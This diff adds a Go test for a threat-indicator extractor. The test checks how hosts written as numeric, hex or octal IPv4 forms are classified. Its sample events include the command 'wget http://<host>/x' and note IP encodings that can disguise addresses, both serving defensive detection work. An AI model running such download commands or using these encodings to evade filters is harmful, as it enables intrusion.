@@ -532,3 +532,28 @@ func TestExtractURLSchemeAnyCase(t *testing.T) {
 		}
 	}
 }
+
+// A host whose last label is a number is an IPv4 address to URL parsers:
+// "127.1", "0x7f.0.0.1", "0177.0.0.1" and "2130706433" are all 127.0.0.1.
+// Such hosts were reported as domain IOCs, loopback and private ones included.
+func TestExtractNumericURLHosts(t *testing.T) {
+	e := NewExtractor()
+	for _, h := range []string{"127.1", "0x7f.0.0.1", "0177.0.0.1", "2130706433", "10.1", "192.168.1.1.", "1.2.3.4.5", "999.1.1.1", "0x100000000"} {
+		got := iocSet(e.Extract(makeIOCEvent("198.51.100.7", "command", "wget http://"+h+"/x", nil)))
+		for k := range got {
+			if strings.HasPrefix(k, "domain:") || (strings.HasPrefix(k, "ip:") && k != "ip:198.51.100.7") {
+				t.Errorf("host %q: reported %s", h, k)
+			}
+		}
+	}
+	for h, want := range map[string]string{
+		"0xcb.0.0x71.9": "ip:203.0.113.9",
+		"3405803785":    "ip:203.0.113.9",
+		"203.0.28937":   "ip:203.0.113.9",
+	} {
+		got := iocSet(e.Extract(makeIOCEvent("198.51.100.7", "command", "wget http://"+h+"/x", nil)))
+		if got[want] == 0 {
+			t.Errorf("host %q: missing %s (got %v)", h, want, got)
+		}
+	}
+}
